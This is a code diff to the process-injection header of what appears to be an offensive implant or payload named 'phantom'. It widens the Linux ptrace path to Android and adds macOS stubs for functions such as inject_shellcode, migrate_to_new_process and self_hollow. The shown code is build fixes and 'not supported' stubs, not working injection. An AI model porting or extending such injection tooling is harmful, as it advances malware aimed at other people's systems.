@@ -395,8 +395,8 @@ inline bool self_hollow() {
 
 } // namespace injection
 
-#else
-// Linux ptrace-based injection
+#elif defined(__linux__)
+// Linux (and Android) ptrace-based injection
 
 #include <unistd.h>
 #include <sys/ptrace.h>
@@ -412,6 +412,15 @@ inline bool self_hollow() {
 #include <cerrno>
 #include <cstring>
 #include <cstdint>
+
+// NT_PRSTATUS — the ELF note that names the register set — is declared by
+// <elf.h> on glibc (which this file cannot include, see the <linux/elf.h> note
+// above) and bionic does not declare it at all, so the aarch64 path did not
+// compile for Android: "use of undeclared identifier 'NT_PRSTATUS'". The value
+// is fixed by the ELF ABI.
+#ifndef NT_PRSTATUS
+#define NT_PRSTATUS 1
+#endif
 
 namespace injection {
 
@@ -694,6 +703,52 @@ inline std::string current_process_name() {
     if (pos != std::string::npos) name = name.substr(pos + 1);
     return name;
 }
+
+inline bool self_hollow() { return false; }
+
+} // namespace injection
+
+#else
+// macOS and any other POSIX without Linux ptrace: same API, honest stubs.
+
+#include <unistd.h>
+#include <string>
+#include <vector>
+
+namespace injection {
+
+// Darwin HAS ptrace(2), but a different set of requests (PTRACE_ATTACH /
+// PTRACE_DETACH are glibc names), no process_vm_writev and no
+// user_regs_struct — the Linux implementation simply does not exist here:
+//
+//     src/injection.h:545:23: error: use of undeclared identifier 'PTRACE_ATTACH'
+//     src/injection.h:558:29: error: variable has incomplete type 'struct user_regs_struct'
+//     src/injection.h:606:23: error: use of undeclared identifier 'process_vm_writev'
+//
+// main.cpp calls this API unconditionally (inject_shellcode,
+// migrate_to_new_process, self_hollow), so the payload must provide it and
+// answer "not supported here" — a command that reports its limits beats a
+// payload that does not build.
+
+inline pid_t get_process_id_by_name(const std::string&) { return 0; }
+
+inline std::vector<unsigned char> build_execve_shellcode(const std::string&) {
+    return {};
+}
+
+inline std::string write_binary_to_temp(const std::vector<unsigned char>&) {
+    return "";
+}
+
+inline std::string inject_shellcode(pid_t, const std::vector<unsigned char>&) {
+    return "Process injection is not supported on this platform.";
+}
+
+inline std::string migrate_to_new_process(const std::vector<unsigned char>&) {
+    return "Process migration is not supported on this platform.";
+}
+
+inline std::string current_process_name() { return "phantom"; }
 
 inline bool self_hollow() { return false; }
 
